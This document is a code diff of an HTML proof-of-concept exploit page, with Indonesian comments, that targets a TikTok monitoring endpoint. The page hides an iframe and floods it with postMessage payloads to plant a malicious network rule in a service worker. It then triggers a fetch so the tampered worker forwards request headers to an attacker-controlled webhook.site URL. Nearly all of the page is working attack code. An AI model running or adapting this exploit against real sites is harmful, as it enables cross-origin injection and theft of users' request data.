@@ -1,24 +1,31 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Service Verification V2</title>
+    <title>Service Verification System</title>
 </head>
-<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 20px;">
-    <h1>[ STATUS: INJECTING ]</h1>
-    
+<body style="background: #000; color: #0f0; font-family: monospace; text-align: center; padding-top: 50px;">
+    <div style="border: 1px solid #0f0; display: inline-block; padding: 20px;">
+        <h1 id="status">[ INITIALIZING ]</h1>
+        <p id="sub-status">Preparing Zero-Click Tunnel...</p>
+    </div>
+
     <iframe id="pwn_gate" 
             src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" 
             style="display:none;"></iframe>
 
     <script>
         const gate = document.getElementById('pwn_gate');
-        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e";
+        const statusH1 = document.getElementById('status');
+        const statusP = document.getElementById('sub-status');
+        
+        // GANTI INI DENGAN ID WEBHOOK LU
+        const webhook = "https://webhook.site/60ce3310-1a67-444f-90e0-b1f91ae9881e"; 
 
         const payload = {
             source: "main_thread",
             eventName: "network_rule",
             data: [{
-                ruleName: "zero_click_final_v4",
+                ruleName: "zero_click_final_v5_stable",
                 global: true,
                 conditions: [],
                 handlers: [{
@@ -30,37 +37,51 @@
             }]
         };
 
+        function log(h1, p) {
+            statusH1.innerText = h1;
+            statusP.innerText = p;
+            console.log(h1 + ": " + p);
+        }
+
         gate.onload = function() {
-            console.log("Gate Loaded (200 OK). Initializing injection...");
+            log("[ GATE OPEN ]", "Waking up Service Worker...");
             
-            // 1. Kirim payload berkali-kali agar ditangkap listener message di pns_logic.js
-            let count = 0;
-            const bomb = setInterval(() => {
-                try {
-                    gate.contentWindow.postMessage(payload, "*");
-                } catch(e) {}
-                count++;
-                if (count > 30) {
-                    clearInterval(bomb);
-                    document.querySelector('h1').innerText = "[ STATUS: WAITING FOR CACHE ]";
+            // 1. Kirim sinyal pancingan agar SW aktif (Wake-up call)
+            gate.contentWindow.postMessage({source: "main_thread", eventName: "ready_for_msg"}, "*");
+
+            setTimeout(() => {
+                log("[ INJECTING ]", "Firing persistent payload sequence...");
+                
+                // 2. Tembakkan payload berkali-kali untuk menjamin masuk ke listener message
+                let count = 0;
+                const bomb = setInterval(() => {
+                    try {
+                        gate.contentWindow.postMessage(payload, "*");
+                    } catch(e) {}
                     
-                    // 2. Jeda 5 detik: SW butuh waktu simpan rule ke Cache Storage
-                    setTimeout(executeTrigger, 5000);
-                }
-            }, 200);
+                    count++;
+                    if (count > 40) {
+                        clearInterval(bomb);
+                        log("[ WAITING ]", "Allowing 7s for Cache Storage persistence...");
+                        
+                        // 3. JEDA KRUSIAL: Memberi waktu SW menulis ke Cache Storage
+                        setTimeout(executeFinalTrigger, 7000);
+                    }
+                }, 150);
+            }, 1000);
         };
 
-        function executeTrigger() {
-            document.querySelector('h1').innerText = "[ STATUS: TRIGGERING FETCH ]";
-            console.log("Triggering fetch now...");
+        function executeFinalTrigger() {
+            log("[ TRIGGERING ]", "Sending fetch request through Service Worker...");
             
-            // 3. Trigger fetch ke endpoint yang sama agar diintersep oleh SW
+            // 4. Trigger fetch ke endpoint yang sama (200 OK)
+            // Ini akan memaksa SW yang sudah terinfeksi mengirim header ke webhook lu
             fetch("https://mon.tiktokv.com/monitor_web/settings/browser-settings", { 
                 mode: 'no-cors',
                 cache: 'no-store' 
             }).then(() => {
-                console.log("Request sent. Check Reqable/Webhook now!");
-                document.querySelector('h1').innerText = "[ STATUS: DONE - CHECK REQABLE ]";
+                log("[ DONE ]", "Check Reqable or Webhook for X-Pns-Referrer");
+                console.log("PoC Finished. Verify via Cache Storage if header is missing.");
             });
         }
     </script>
